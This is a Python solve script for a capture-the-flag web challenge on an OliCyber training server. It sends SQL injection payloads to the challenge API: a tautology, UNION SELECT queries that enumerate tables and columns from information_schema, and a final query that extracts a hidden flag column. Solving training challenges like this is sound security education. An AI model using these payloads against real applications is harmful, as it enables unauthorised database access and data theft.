#!/usr/bin/env python3
"""
This one is kind of tricky. I had to firstly retrieve all of the tables present in the database.
Then search all of the columns in the hidden table, and only then get the flag from the hidden column.
Reference the documentation: http://web-17.challs.olicyber.it/union#5
"""
import requests
import binascii
import time

class Injection:
    def __init__(self, host):
        self.session = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        response = self.session.get(self.base_url + 'get_token')
        response = response.json()
        self.token = response['token']

    def _do_raw_request(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.session.post(url, json = data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

inj = Injection("http://web-17.challs.olicyber.it/")
# Logical SQL Injection to get some info
response, error = inj.union("' OR '1'='1")
print(response)
print(error)
# Obtain all tables present in the database
response, error = inj.union("' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema=DATABASE() -- ")
print(response)
print(error)
# Get columns from all tables 
response, error = inj.union("' UNION SELECT 1,2,3,4,table_name,column_name FROM information_schema.columns WHERE table_schema=DATABASE() -- ")
print(response)
print(error)
response, error = inj.union("' UNION SELECT 1,2,3,4,5,flag FROM real_data -- ")
print(response)
print(error)
